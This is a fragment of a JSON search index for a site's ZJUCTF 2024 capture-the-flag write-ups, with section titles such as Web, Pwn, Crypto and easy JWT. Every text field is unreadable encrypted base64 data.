BHC2KC3B7rwKcU366Gz80Ga3as4dtGSSS2DKZeYXv1PUZ0m/9Mw47fV4Ugo49POMiyh4s/JVtVY2vSh5jPjAv+lmx9UNJxLY13JXNujuhWlZShRGlscFnNzMyRzonkhM9Ky+VwI0VJhhbUiKkoM25MhoU3+J++s2Na0KpmBk28PLzxxO9k8tA38KzZYY8h0osNPxfpgl826WffDOLRvU+Uzb7p5uNXxLwRbNWjLBuQ0N9z17IAxDfHu26TLLsRKnsEIpnNJGaX2Vkg4JiK+GXK1GVGm+zvMKpTlssdsONjb+IPnKzw9wXIrDtdayBySoHSDQrrTdbhlR2vBeHgXhzWPkGIhVEs4HJMGK3I=;^","title":"Minec(re)tf"},{"location":"writeups/zjuctf2024/#reverse","text":"wEy6sjsVbh6osBSW+XenEw==;4MLiBBXMuqU6+Uy2h9Awk+fE+NkQ+T8FCAXUFul0X98=;^","title":"Reverse"},{"location":"writeups/zjuctf2024/#rev-beginner-1-2-3","text":"G6gNTKqvOAZo7HTWrTZdfw==;9XW4MrX8IXMblriX9YB927i2q0UtpR7HdYoOZEiYLYHu4MF6zGMRgCmDZ0b+fB1Lwyg+f6ythxa5OLkcyDDCmsb6DOF4gC2OiTC8xvWo1fDTJzzPLeg2ROLdTwRIWPP4;^","title":"rev beginner 1 2 3"},{"location":"writeups/zjuctf2024/#minecretf-unity-edition","text":"AB1HyBqXWQ8+Mq1SVw2lGw==;mlHQWJjtIHpUmSnENEx02ggJDGRkaFN8GllIz45P/QZCWpzy5FOqCTe3Xc9xXA7nsheijEdHNi4uJFdpjBAB6JpUo10DVG9UxCQ0m/X3auu6wrJ9uQP7CZ3d+Ikg6iPdJ1NHY2ZWIhPeAqRS3NZ92Axo6tAHKjjigWX2YzcFrng=;^","title":"Minec(re)tf Unity Edition"},{"location":"writeups/zjuctf2024/#rukma","text":"qeuq9bv5vH6R+MSgkiNs0g==;GKZTDegdn/E3qLk5HxRp4UGIDuGHr4/dsZavjxW7NoL+8XF+99SStfkaIrtQNppYcpITAMJp+woaYO+6Zpd1aBUMPMAVlwzeNUhgxQRwsg9fA3OxRhqVquyr7I6PJ0X81EWjFWzy9BWwnPYanmHFAsh9Vphunjpci0AYMlPQZaM=;^","title":"Rukma"},{"location":"writeups/zjuctf2024/#easyhap","text":"MmfhCj6NQ9eeaJtVxcsZyg==;kLtgpfUrLi0UhVtJX7EIMNOWOLd4KI5dnQb6Sh+D9+WQKp7aopzszFfDFRGo1WHqWYj89UcY6LsPw1aHIu2LwdqK1NjTaBo3EnLm13DexSU2NNoioeF81273hvO+u6kUhER2OkRLZg8N81JjGrB/qduWcX97Y+lPll5X/pFl0MhHB/kIDeTC+KTqdW5jUGn+N3RsEliNfSYrW+V0lCtNw3SHphxjT+SjJWaCBb0Z0SQXioGWCJkO6+QjXzwPFUbZw5NcvM2jvrMkeYWpHgyLxct9NrBBC8LjkgGoeIqHKNp6AAvj2g3+t5uzbbL/5mQf15vhwkIwVSxM1hykbwjZ1KSMA1ivavYPrt7KbXUS6oO5JnH9IBWop/mlwLmQbimoVE7q12K6uZ9Dvmse4Z3Vd+bpkmOlOqci48PKKKLlVoAO+Ebq4feGzeYJMC102EFglrQktaKGWn9fWJqYcCwC7Bug+x0J6oSYzFoKmLKiT5SEDVhouHNW0WsRPbwAhRxksYcon08ZVQci/HgHrsT7TCAsEVYHYrZVB+eOBZ+MEMUdKkTGi5KmNzg26qXwKHS1rIbB8Zsluh5FxPIfg6zqR91JZSDzsdMtzNkRHkYfx7dClkrCObkJypOHGzGlB3Zb9pijzB3974Py/eVvO0aBkjM/Tb8zVpYSD/xGuN0edEUO/34B1X8LHFCXbvfJR5SzkLZXknP/Kaj1V5WqwdtAtxRk4wXGW6FYTiw22eYsxSUAAQc6o7UDU8HNzdSrJRsMb6Uh2M2pPv6sQGva+iueCGieu4GEwZKx8mJmDg+yothcexVEeN4laSw+z8P9zrK35s6EMzBPZhBf+4x4ry36/HuDvsXeA9vPJonkoVXUAl29esaAsOQo96Ce8wGIPl1R8eyx9zgmC/BUPCYbmOH1ZK5rGsQIHqSiDyNXRnB3Ojalr+akMk6I02yz3sBfL2KEncs3Ccd9qA2Zxe+FFK7cdPgZVBu69rBHAwBT7CfY+N9Vpq6nprPz3AKhAMJobEotXbfOmJTklU3Ly+m7ShAOhx8yUKQTB9/VeHCfr5IkIeZd6HsTNn1vPq9WJwTiod/2MJONHBqjZ0a8Qz5IYl+M0iABl06mdNuTfeTh2osMBz8u3O0Vu9qrYxiVUVXB7vFi;^","title":"easyhap"},{"location":"writeups/zjuctf2024/#web","text":"DOCAimyM2+y7foO9MBKlOg==;RN32tZ/60u0BHvlG45oFDTC3Hel3P/a7/4XhzYXH7hE=;^","title":"Web"},{"location":"writeups/zjuctf2024/#easy-pentest","text":"DURZ35LyDgZx9KLCDq+Jxw==;1JtdP6I/pjWDVcqX30aLSa7ViFsKp1CLLdQs4zcu4gWdOspYbl9b5lBVCrDkxQE2CuZkJ4OBTxTPlttB+r2QB6x3tSUluCjPxswoVxKP8coG+sOiDMhcKxIwMdU6wjmVH9kZjvraIJIl2IdCocDX2IezdqkzyDujCwru4qojIsyz82Vy57Oqe7uJWjvMOCexjUeAUOFNQPYhK1gMYgikipTgEtuGpRrJWhtsD+O+0ETlYUD4hc9MGXZMO8E9UkXPNRx4+NtOoVXK/aO3XaTtF3UePoqY9le8S/a0fL+5lnjcLCow/BRILl449eiRCtdkbR7a+WfgWhQVwJL7N2ZFt2v69Kl7iBfMjAE+MABgAeG+f5YLahABKLuhApQXlkJWWDwn7Ys4vdWwaqyFD+G0qgbMyLwongG0PaCXo87f1TArY12OcgHzLYbC4ukbFsW0qHqxiiSgMuD0Wwgt4OMkqSc921Pe43ysOxPYTkIZ5+sotrRcskENA8P7DsrWUHcTFp+3eJqQm/IJ8D5lAGSXc1EFz6r++yGn60ehIyH+MJS9FQegq879XI9etGJDyBaN9TBK2AkAZMWwcGnxTRWSdNdy+1cOTJS9uOk/C/PAr/tGMBfZRbi7O+jp/nw+uINopRjR1MsNh0jz5xTgnelrRy85jaEoxiWDIr/MJl8FDTE+aWSTRdYtFL8QOi15AvQXCRgcGBrvf6lIUL9UFdMTCpL9LN0Gx/UEYDcGKGR4C6tkjxjSoKvBEjt89FAhx0aAgLWcyQoxn/MAqLZEoXBTG7DooOLBhJcaAAoJLRtdISMDydJTc3G+lOdlgDmne+d2jLmeekodsnlQfOlD3W/0kqBc8WpTsC4IrFA25GMd6sMCCZ7i7uaAqB39vYk6QIYJXLZbCExTREdgfhLy42aEzCYu/ItV3UGgYFEvR8o9xx1hUMqSo4YBzE9Go+mawokIhC73eIyMILeYxoFwtBBMAXGKp0IbguVb9u9LrZZtAqBTl1NpF4pMhAKRVbL7DS7cURnxYDN99jZ5SXK5mzYgGs3o0DhwJPqDt8lwRYrJCko=;^","title":"easy Pentest"},{"location":"writeups/zjuctf2024/#easy-jwt","text":"tXMFhR687TokShTKfLZVZQ==;UnFU6UGxND9A1Gaz4T3WAcd6U2R7+kxqSma6Ce6WNDdmnWJWrgOeB+zYNyQlUbpJoiKecK2yXvhRMpl67yAw0bLwbBw8zUltO8nbRUskm6CC5tgPk8N5cvid9L56FwAUGpClAJ78lbpDAlX3ULPI/ByNvwgwDuRDXQaaqWqgaFATtWNCk1DtV8K/vgt1jFVIDiJZ1JjKGHpsgOKjWl/LLC+NYTqL8UIv/y8PJOOKJ/pLsZdlaoK/fS6ssmwy07ppiM8vgbDtOsSY3YQv+Ns1sFw24Xf5ZVRnajJQdfk6YPjcfWtQA5Na21wIER81rjb7q7Q7Np6pqs3+A3I/L5dGYI2YUtCaeOGtqVa7X8CNjLm3d22xyUgoCaF+Oj2jlHq8s68eQdfsn/yKBZdglujCDGySJWuAEJZu4PMz7l89/pQ+DV2rfpXtnSjadSBF+nOBQ5GtNQclh5HaXajGEbALB4z0l1cxotU6oDnvrtj3bI8rtIsCyFBF+MTBLZFCUwAi;^","title":"easy JWT"},{"location":"writeups/zjuctf2024/#_2","text":"47kWamYDL0M3fk6KLzYRBw==;VB2UzFzLT1ni1p589j0LHVIPYc4qy8NmH477ZXazp+54ux0xkUVRtXozUQs8m6P80MLNPxgf28nQArZJArLaQoBUktFg6/E4nTosApSz5cWm+a2xP3ooBUzEPLuoB6mcSgffRg3nKf1aZCO4bgJPN1sdNVd4vcP6W+HtODYUMW0ZyidFXmyLviS/pCJOycTQJaPzKfO0mVdnlVABufFKqMoU4O9vBNg8VeEwLzSPyuLAxmEtr+63TfohoFOnQJno;^","title":"\u5c71\u96c0"},{"location":"writeups/zjuctf2024/#aviator","text":"Scqi2nAv0a7XyjggCrs0kg==;+7PaWYa4EaJOXNrmq8CcGGzp0A44oj1kAtq6Pk2kppNesqXqsnNjgk0GujJTBVRlwWJTmmg4SyDWEbX6l0IoffQBYfZmY1H7RZwSqFW7CjYMhSDaWINC0uZzwYPlKByuIBrjVd0jente1RE/0j3LUWK9TlWJW8KYpU/LuuCdvaXRsY8o/xbnIQr64xK46bIzwZoAj1v7QYuxhVRaYt2NwD0j5t7ft4hfa38ynRU+O/1nMuEItfGdyaZm8JdAezMG5E9ioEwe4DplDxFTjld0Tu9hTCjBVQtvVYaqcgi3jW16mK1wU6yPvPBwni/90Cphsq86HwUlzP+cjO+VB7FelCuggXT2aizjggLrqgOqas5iYbEN0rqnrDlJP61bCPch;^","title":"Aviator"},{"location":"writeups/zjuctf2024/#crypto","text":"5GWN1QDgXkiAoi2t6dmziQ==;ZT1B6aR+CPExRl4QxDm0LvjmcDRER+HsYT48ybf29js=;^","title":"Crypto"},{"location":"writeups/zjuctf2024/#shad0wtime","text":"OXuH8l+b9VwBdox7PYnbKw==;i62k+kPcFWre2tAoyCtQ8WAUgMomDVG11Q9XQ5z7ujIeHFP1aVBrIzrDLPty5g674n+4jPlEgxKYM2p5xdRGYShcNzuxGiNtSi3eeanvYiHSIJUr/1BUTS+RhmxIig5IpcSbibEGaIch6lrN8cQosX5ylQ5PF6VK0zTWrP8zFaA1kI3tG9St8kwxSao+N+rx/1nxy7Qw7TXwHdp6seEkXT9ayuGp7aBEfh4k9Z6sVLnRfcIBvRnNZ5cipVd6sChdBv7XJZe59m01tZk+4/ldh7wKRyp7bmrqnGShsHQRx0QQHFmxRT32/gcKUfrBdtGazT5sabmQG2+n5CelbZuj/cJcwbPur8ooNdxFQ2T5b1lB2xYwohdNct6ka4T8bPd/oj1YjEfCVKRZ8QFKzn9qyop4F5/lAT1Nu+onJxTOJ+yjSQM5FtLP1FdXNGbDDpuK+SiPeixBHdnAs3wh8Hyu34YC20vOWRmmKG4+L+ECTkai9Z/lu4ljJznB/GDgdstMUZHIedAqth4pmuNrBDkGc1G0xKln6LUF2WBqOID+1yvoS1IBe8p8MHXeF7Wo8VClSrB+21pV2Qdhw0P22V3VPsO+twLHO5SjRlgpH+13wRGqGtGPlNR4ut3QuIY3N2GsZsRM0majtzxSl0rnfNazKO+jdk9WsmrznCzw1PHOaLA0xmBiEOm6OHawjB9w7f+205CCu039M0OCiR4SweSKQggcP64J11gHTsKOxdR1vvWnSDt7Pavz8YYKQ6iBzObY61cKQ8uJu7PVzUiuR4mKOi4AQE90S2TvRXqe7RZNAc/MoTeGKiioVjhFnaUznciiggvxtbcNO64kV3mOjTD1iQ==;^","title":"Shad0wTime"},{"location":"writeups/zjuctf2024/#ezxor","text":"GqEKPGbagOnUA51rMdjdrA==;i1vRxKqPRPwgL4Serxv28umAsunq6xzBpgAmHNAMkttQvEUvp5oA+gRxeQreiJIfFEXyAMMA7WGsMR0XFgMt1H6XtUs7p/DzOwJIgwYw4Z6HszuNcclv6ONzLuQSPtLfp0Oh9p+XZK/t/dXO7BgA0HjhitA6f3X8gVJlEqM7ZN9V887HVF7quzNhUe8LHGlMbv5G2SZFk7g4tfRWG513b+1CHPu2KzwY7xa6APoUZtNQmYkvYwklAMkODnQkRdzpSMf48xCKgi1EdLv0waP9S1PDq0H+uhCafcBosP6gv9J2hcFpr/TsSIV0wKHIjraEX6LheLgYCTJBOdedTC5TEk/taxSP2FaGFvYJ6brjLFOtL4EVPhjFjj6zvsDjn1iCcXDSZtGveDVRhY3fcISJjO6bF3bnUqDEJi2jCGrq9727UF10KV5ZEfbqub1Z782to3alXawftlsHcH0OJq7HvEQcSbZ2fi1+Bfn6fpmaiJNF+1StjzvEqmkfed0oIPZfxRlNnVE8a+MZQdHozD54iWzjfhVb9CebfledQ29rs1AiPepVEZ13LKvNE52fMjz07fpvPd5fFt0ZdUztf7FGoSIGXD42tZKCyuSFM9eyeJ+le0vH6lKjGYZ0bUTYMPXBstRQADjQS5bPTgU9UFInij7CNxh1BK9MFiR+mW9V5cMhOK5RVQuFaaEeJvKV4tV9dwlu8KYx5g7/TxYUv6smTAOTHD6mWhNcW74MB1uwOOw4ThkM0wFiNL4/mkQuL0toWAOfICdNv5SRo/fSGBdEV3fcBkDhIJn3JHTXvVxh8ITlGVTw8NnNSVwsdmAGLJ2fhu/Fs5NWK7nOBxc592VWZJO6VU4NuwJ1qiaQEcpwf8Bqg2Dpt2+TRwm+huDSNRTShDpLSFkssOKvYVkTYGKRuA3FYnaFIiflOO5M4Am5elckAOl32DhF4o9rJW+jTb6YElKsHHAu16lXUaK99nGBPg==;^","title":"ezxor"},{"location":"writeups/zjuctf2024/#seed","text":"hnl5MhWr4Vv9DxGtOMp0Nw==;WmPJCdhEASB1MO1Y/n7+zeFnRy2DLzmUMjTWzZ6yW5so9y+JtsFo7mJZPLV+zJGtdf5YVmlwecsEiIMs0td2x//pX+ly6hChzGaau6s6MRk43P7mO/x+eutSLgI4ZlLiVAKmUvU35uv6bix8Cz8bqTPgkCdePFUnErznCDcCio2AQwkTeKvO3vPXCwlUPl9sENtUyynqTjWeWU/YE27pmzm7IX2YnHMXd9VUGMRYyNqlN4unnD+P/a3rNMfq7Yu8y1Ggq6O6RQQHkCv0qatlL0Z3nOGqKRaYa223MuwozzgA96GLZJeXqlfmzdkbAOIRSnd34zciZf22QADCyQ/Mt1fj5rg8SLe5mGKC1LmYtgfvvtz+uucdGgDyHItTOkr5MdqvR5bnPeM/u5H5sDDQd8zyec2qmLsRiaUfrFA9p2n/t6Ly21ZK4tfHTrQRFu1ISz+3HdKL983LZqlCHvKZqzpLUtfSEi74cobzxGQwWnIqOG3kazQ1MxsZ296aOla2k4tmKsYUBfrl0jiUQ8YcW+XUhXB6YqRelx3rZxjBXqEeK2pcGNDUsEwi3QKKQPzNsq7hLi+jS2wOCW8KAmO9WVlf8wPQQIuxOg73xm7taeQoqShhL2bILABkCd28bP1rxKHfxDPIQeNa9oCHzycTIkGEdvA+2kP9U0OtnacvrgB2t2KU497mnymm39cHhfcv/TkkUW/QioaTbulN2nhdqf0Bjza6GwxrIznD87+aHTCKpYRFb4aysH1JcrgM2dArsMdHes/TOXfMemFG48WpmO/hQ6aIVDYAMVxfulZuXZlS40azviOi40jHbGzlwQGchwClZTnNqJDtMtngL412g7SRtZ/CHyUWS9is8srhxz3S5b5bsuMqcjsw3Gqgps/BWM4Q4pGaxkXXf2JtmbGfmUuvQqTNc2quLGBiUXtENE1HCuUd0EJh49k1wWKOC4CMzIO7TSRukysxHRxb1DSoel4bLC2l94goAUQCsGq4c0crZvD3YytDas60qpOIjB0kSyqPtyiHTzGXO2epH8G0+GTjYhwBfueRoHHPiHIMVe7cv+780oyZZ/o20usSCiFy9KOxU4NGPQK92X62BOI3hCT06I4+S7Jj8yJ35nRNiR+kzS/Tsiqxhtp/+SEV5/nz0FFmFw9b3uUBoRGWCPWunZq9YLZPdUg7qO8a7EtHAIrNtbeg3mO0tIza4IQiI89ht2QaGjvyi+vcbnSRkKiNRzN8npvN7+ZJ2LrrTvG6muekeMc51WVrsefNWDFV04P67UzT4T4TrgE0wOJu+rPaw5VzfXSvUEUVMP7C+xn/bVJG94OxFyUIx/OAvn5MI0j7bQ7tbtyD/c8l2Kl2hAekTuN2ZypfiOPD9AqvqaBMyM+6bln2RJbgM7Gf5jhklMmOD1J2HoF8B/D7l69Xz+yNN2mF/aj3yqeWBDcbanbuhCgmqJJX62UZ7VRRJ49OXGlL0AGcfoNditIYy+GppesknjI7GTwTU5uhxhAEzVSOW1gsm1YncK22gbBCgRIfo+f7FDCKyPBzfKuGorzxlcGgmVXJJZJk/mt5FaIK/YFEer1UqDZw9VguwNrLjU4etzWUfI7KPCLcUvcHo2+hnJI7rW4CsJFIAr44jDyC7VaK8d3nco0MFGd7ruHgIEpFNebS8kFr9aPOs5YeaIjFYIhOpmBRK0Kc5ImKUoKFS88N/pZrJ8/22eROb1epdRezvpgjQhND0FrKA435Q6n9KKaYdPAq0ex7UE1nnq7o3KLUwlwpGrE7HJT4g8aI1r+Nhm0lHDNTMSltl37b2sgokeVA65PXu7vyW51flE6hPwSNW45eFX112BZrMvKrmURyycveXCZicifrZaiBeBC7y4Zrc95Eu63TEB5pRdRHG+06U/Bqkqtqcs8Tn7jyK0gF9maffismvfrXIl8RqDpTGIO1tq2QnKbVwyK3sqGpQY034/AhK96yxHJFSzdm6DPsUq5QWk2y/s2bQZ4pLvPOzVtJ+MAUdFzbtZatBGi/KXjM7Ds1T3CwTPE4c2oK2e8w1NeURmBqDq32xsse52OxuhThSa5+3twV9KcfYl8hb93ZN6C8znbic7t3pNG/wA9bFFsvbrvH6alvS6wJJSDRuL89ozFUpcxaOMnMCuez9dRuvTGTaCd8/iQicCofwrRb5TTqKlOHshb7TTtk2SOmEdgjzE9S7fD4RbtcucAsLh+qZr147s90J4U7+rJn6cea+qIqJoOUZKuqFRtI/KCtRkIpg7CgT+zKZBUUmALTyWDrz5f0edDfwEPEsg9Gjk0/cihHgL1CqYMO2Rj1CqxNF4yqlZf3ijI3G4kNTeH6cOLp4uyp8tM+Oml17muLfeTTfeiTakV3Je+WlS4DkrbTxBEmSw8qmLGd2pPmmwqspzCeh6Np2a4AfudW0MfJ4/k4bEkMu7584MQTX6tut+LOKhZ9ZoyGGmDHwEss6M6j/FMqyR7Yt4TfkyNbJiorGDcDgVxpEnRDOXkpxyvYDZdHs/TJIu67wRwjnuzah3x1IRFXX4iVS2XHQdnmI3q2X8yVLbdFLg6HznJChR6V9/3hx6qXF5Zi7zIE0qaXCW32HxPfjVSAPbvbYSj0oIJ99YLG7YS4PqWmfAccdf6hUd1dzJnTymbO1WS9/59p3mLVDtMUO6jjrgieBqFkxdeZ0EOZb3/qn7cEqI49ula9bAym1C24LMfi8ySMSZahMTFZ5mp95uDa2IW5THUmGzF3JWHun932gaBB1MJZVnSHW1seo4A1JEi7J6eTCMolNoWaUFL+qWALboe6ImCLbA6BDZ7ngdi/xKvip1zp/s55rhLr8TmQwSGwVEy53qy1IYVpNAhl4am1NerPJMPt+1qtzL9bZJPO7j+Hp+jPEcYBazt8IyXl78QJlRzsjHeQ0iE4bOkjo7/IcI7BFyS0UkXJ2JRwxtj+EjwVsc5HgIUUkMX37ItBl2JuVSLvQtWlncodtE02mqIfjcJ+mpJ7MxLN1c3L/tORQfbIaM2Gu1Lgiu0alRLYSapIMnCbYT8tIsR5vlewI5EqTrWNfDWEL6x2xgERQfxmnMt7R76L1bliiTc17lQ35tLXmxjsu6QkNWvxRvTr5A+LSdWxwn1CWMNU0jTGLWwR76HcnMzIPWKBFQu0AdIBBswQ4HxzLgR+XEivj5mNhr/v0f1ZZb5UJbds5cQD5kd2fdD4iGNR97OCh4S/gNFiw302YrnPuXEuoO4yayizAVaYYK2wiEDVcN83gciqo7xz2sMP/JGz72ZfCNwJzlZ6QwTE8x254eb1PlS4UDBT2V5xUW0WcYWAt+h/M19ybMPLmKooWs4Q69PM23ONWqFCaeyqBOGC+b3rO3QaliHIVGxnVA6mS7ODxVpvvxtSDhnh4rH0UJx/tMB3m4FKMabnK8SN8q7BwkJjNjh54PrEU8nqpORkn7KVKX4dj/jnidR7AsbR72hnvNwy7AmJd0zNpkKeI5zWrB3+PUKSm2pbWRI/Q0hGtdxvCkuL+3pvbDvVAaF5i6vpgcMq8x+BRL5wLvaFzzbqxqllWzGo8FVq+hLvj2LVRlyXxUEpRpptbxh74SH45+oCwkgnK14n9msl64nP68XptKJ9N4s+A8imH3QMaFWBqq+AD8dSK4GERljIdJU0iJZFrpmxDv7XrCTy/UARWT+1zLhj1Fo9bFeAAGAiP2B6Kopbzi9qnZpu49jjRZb7/qXGsk/SLVcLkRE9si3Glr2S9s4OwhXxuvFYuNy+uVIhFPAFmx//HIdwEFevM1acheAtpODlNrhCIciSaq8C+jd+aDKlzhFjaf8+WgnUeIVdqWXQt885fHdXK8I+qdNIox7uNganDOJz2m+OHqTXj1sn086rJ3AXV+W2uBQzEe1cUE1VC23hY3Cu0fGQ4uLmJoEs+g87aFMqNb/8HWFGs/EQmSt5l2Uh3uxvzA0VvDfgs1KEm8+8n88rHBwPguzJNqaVBcPUTjPmFvRm183xKHm8dO6A7USAaNcSdttTEILsexMC4uKTRuCP/6+Ze6CwaX3jjJJjWJoaJRGhkCmfqyecpJTbJEiUROiJ5HkrN6Cqw5R+NKz/mvvF1dWKs3afI7QzDOkBYixa2QfXZzm8ZCDTR6xsCZHIdvTwgwUe/eBLZA1sVAh3bbqu11MHU+qntcbFR6EZ8Ut9x0hgKU2RpKQfSv6FTYQfSBF2/xDiITu7T73XBBKNcyggVRq6t6DQ7SQPIWwt9GZgU5uqTisND7R2Co/tK1GAHBnTqxgOJHxTJnENOGHhjXGX0JQV9956ZcmcRNNt5Dc2xGhO6fe8K1kwyGuETuonWt4pNEJAxF5H0Ft98uzzxKXdu7Rngz5L13QzEf/KhOfBkhyswUmfALeJJbGQWRgip/Wl4swIC/Lc7UTeuHc0YS5Og7uX0ju0ppc+hv4rnUpOb0wYNmVll4sT3rqp951iQM5zO9gp2OnYzYxStDf1EZnP3iCfYCzGY5sV4kDYOWm42Khovc9TsJUR2pD0qEKPiospZV2AsAOWwqEhzsRBCwmWJYBXVe+en7sHl8Zi9bpXkOh9DgfXJeRVxFfkZkmSVIyw68YaH03sP8PvCzcEgyRylI9xvBXCaWm9AYbLKh7vIacPMKGWqoWzEghmg7YdwPVTFNSxj8A4qq6PsFDUFShMMUsSuLYNmBDwD4yi0heXdv2ix5keUaNXBYR07v7H7qGNW5+Knv/RrLrsoA/v8JMNn5UFQ+7L0siUXFjnlnrTGc+Wsx4Zz1WwMRNVqQPnb0kafSKd1Lg0Iw5XGj0XpRCYGPvH9Fj7znFKNuVfM2Pv09kakZWaEOtnymLz5OGaEhY5zF3xyoy/Hy+CqxXktdAnT6YJJjQZGAGDqPwWktVfvAGElIV+AGrMywB7JMue6zfrUMVo0AVgMVBcOGnVf8OQklnQOxW7LjUUb9Vobimgr2rae5E7iQjflu84C+AyX4cM5m+ibt7qUq10SXMa/kUkUF8NDej52hH/hwAfwnk/gT1wFXZ+aCRDb/nbE0AOrZ/3+m62V+4VAtSouAzO7on0uJ0HXdvaA03L8UpsDg5ypUch5HskVyBTkciQBXNUt/PSZj7yTf2QzxnqGxgMtTWNaWxSIF/a/9hYCxbBZZEjoQeOj9VpOomrG0FZTlHRCS1ugJuLS+U13COy4axWcXQ5t5RNoA9YAxKZRbkLzoo7cQvmJY7eWznCUnUCdFHYSCwmZgOHV2ev+I9RUVvaBJltiGCAv/tX2S7EM+tOGu4miSmKGnXE/h260qgm7y+7RHqJK78gr9E2qHHaPq8Z1xcB/M/pJcr3UXm86YzoloaV1cnCQf52tZSXpkgeudZzGdma1eQzGsV+wBvGMWM7l8QaRBYxDQP1DDhi8UdvjuU25WliKQIKoKJ1ZuPNbO+9XdpYx0WS8JB65PgGxQDQ2DzkE0DWZfxsDH2fCty/vLq04Hl2wOxlwA7Ut8U5vJL8QAqy9QMkw+TOIdS48oGgKmzYznrUxykTS+i9R2LRHJSw4jYzZi16SUP3zSP4YW+GugPbl8pdA2VjakUgUsBw507cs5rYYQSjoh5+MzpGCp3q5sqRahrgp9Sh0Dlg/AWtdL+Kx+QElssXFhe5QBHUR5TrAzZ4Vog3MeVqStmS4F9yXpUhWPlNNuq9Lgda7s4rsXKIhBnDKJB2svMu/bszg4WmwsfoohazO7O2oupBAAQudeGHYEPcS3r/edk8u9DGI99yVBO4l1dJQpqC7IM9PLDIVAohExY7cGhF6cCVWexe9o3dQRyRdzIxog8E3ac5e8T6+kvUxLmameK0A0ZZ7uTarzNVipiN0C+TScryjey/CoUJj7AvbTDZhjTsQtSaXlHMutBMVT905VgLR497/Uu5oQP7RrkdFWYc6acQEUYUA0lARoPbnh9N+qhrwmBJFc0kAVAYQNfVmkGDPgiPYbIwE/ihOaZM8HnZj8gcykT9gjgiQi5ng0NCD+DpHQnsUHgFpUfKZVEnWBXJVhvxcmSKXwJYMOKoWc6NYWSJwY/HapGt/ZLEkHS8ufYghegNZkGqwnaTt53waZakGKpTNrjzkWBA+HQaBJNUM7BFoOMiqC2PPaCqtnx/J2WLbdsyfP/2xZFgqqy8XCComZ/ZhjDuJmUIugn7gK7pGIvD1BQZQjbPzuYtUb9pOnCnJK0/wBjs+C6FlVyYlzogJBbeRTByeQ0UH/HYl7vXR2zivP5wlwiMGEpjOF/UE2rI76Mssf9JpXRiL72J3oY+QYlE8YKK3tyNq6W32iwk8LrS739mj9HOrwUtGQo2MZAJvGMUjL2TtgeRPKrJZFcYJk5Riaq0zYwBehL/sV7/wcK3shpPuwgF/nuQ21rbWyZDfbUqsbco+fHTZalRpHsRmaDVATbWp9XnPMDyeae9wR6zapUUrogTnROezh2k35gmRUlHlwK1GmWuhkqg3fmusqwYkme9hKvrK1zMQrCb6RFgV4BIfJoBr2i2M/9LPnYhPUM+3HiaUcveYt9alSbzFjGBvgJxKK+BMQQFbnf5U/oEaBRpEqOR4w92MsSkhxl++KDgri8BLNkA+b16EE5eGFFOeq4ow9A9CX2QS8Olv66nA8nRcvRTHH7RJwHoywlbMlRoHkwhCvj1OWEQ77+/UgX1iL/Ekrqynvr1xpK7jP+jHqrq6Ezo5/MSN+7C1+qzaKUromiM0gmEreTZFXxrulxbzrzH7LlQktzjvDIFox7MkjRPZd4Hdz5bEcciZu0To+47HcyEzpsC5g+KvlhMOSh7y2tNXFbi;^","title":"Seed?"},{"location":"writeups/zjuctf2024/#pwn","text":"BZFRoUeQVjZZTPrwPAaLyA==;wWJRi6UMEG0zBRtbNk09yIlqhByoN48jxbwNLerskPA=;^","title":"Pwn"},{"location":"writeups/zjuctf2024/#simple-echo","text":"QvOvzWYQI1k8SOrAZ+eJfA==;Z63UfwWyluqI27aEQvZ2l7cNGqsQ2HqNnbxE9vkH2PNWH6WIM8oy1v4C9TD8krk1Jx4yP1p/gkn8CMNt+f9YWwgRCS3tXN9L0ie1ujf3Fe/Xnp5QmEenn+dWsFfySjQDKtbrHPmhM/ADNSViXoLP9hG6AxQpNnSTfTA3wpHamZqgLfFEkzjnvO7H09zITZ/mLh8DhHT+NHp7Fchq3lvtcZHMvHijxe/NjVosrxqBq3tIQeods6cFaNKTb+jZjxjpNm0pqSUKyCBCRfkzj4kMcznpJ/AHiZaJ9LzBMH1ZoTlmXQiW88Oojlyi9wzSpEH8HvhdpvVGbOqXQLwMIvP7fDfOCbZgrtPjV/RWRkodpFrN6ZCqJ+M1XFVVw3FcIPOQBeKRKyOc/9jHUYi8g579rN3A8Jksu5GOtEWlRWXU8SbTAOQXTBnWFtsrP4MvrOxyotwRk+gjqYYi9AO3t2Co0nWxmt0C72SXKo86iHtuI+LyO9fZiZZ2pKFBZ/limdCCtcLbyFhcaxx4Sxv8psgyGknFxpR9S5s641juZ0Xo8GjFsOI3xd6iqEPNwQVslISMs24G9JDgJkrH7qyDHIEEwJLNLw9fikjlf1HtQBaREeb+VFCWG6+zvuNkwgfIcFgqBOqOqdW3xVV+yVK+5xV2t5qEmcNcHtBWopJeYFk0EtF8dzBEkqLm2v+5SluVTTgqsgDGfbHJOqgxtxvZiao2xcoLIHJl7SxIQ6r1hDOta+DxIyZh8JgD+W/7uX+gR6H6ki8q6QgN2B/L/TZdpxh465P0BOIcE7MapDI3tiIfA2Szh8fj0TLwqYzNqmWEQOs2m97ndDBn/c6zdJxylIDGLpfYWZR5/rtZF1+G7P7FREMdMW62Uu7eHbbqMQ4jtE2xtGaXXnOfOzNyl29Eks05kIEqmrlyfEWOpa4mm3AAiKEIxk0raCKWyjcm3TEZbSh56AARHzcIvjZfOuspGQrGYaVRUInJl0oED6RVkDWFlhRvsz7vhYXx7guWb14ZkOzby92Or9fg01GBWKggFjK/X3b0ArT5rsgbGAXp/lX2P0AMODhF/NjZMuapk440+dbKBjt0AuU969SzqwAuzvFQ4iXv2YIi08ubgFGZvyYhRy2mfFVTlvYslnsPxxoP3kyoa2AEkvytGg8sN75S/Tq8U+o8lEj7qFBF5/5f0Pg+qTECGmnOe1KpI6Xw+D070QOGGz16ehoJwtmrLOkpNZ3GzAUQ+sAG0NoESLilizbspZWN/LL628MTUtojZyNxiIEXHFI+pkxp8o+zkNYjtPEHVZzcd25PG6heaoFZL+fDutZJZnpvQtzPqDH9oTDi+p6rsvHnGnZ3RwcOR6m4R1j3hEeKU0qox+I2Wb0/jhD9sOgpbGBYtg4KCrJ5GHOMPMKCAzCsWPowJXamhhn/bmecdsWzzAfT6o+7YjSUaWCF/d1vruVUAErXSOK5TbJ0G32s3kMn4RhSKgA34+NHLXfnexInzfOg6gljNV19mOV1abLzmZn5dGiexFlVcqdEAGequQSPptQXdvDo9daznCy+a/ScJGzIlh4j5bQVEDkkmDkKON6uY0XmTaxDfe9FHS3z8746Cb8b3swcTCdIyIrhaMLVMo4Ra6I4BqUzp+XpfZYwPG5AfJK2pUv1hUU9HsohfiVSRok6reL65O+nhKeInvsNXyk9A9WMQpFM1sqvbf+YgKPXImyi3mlAddwd4L77gn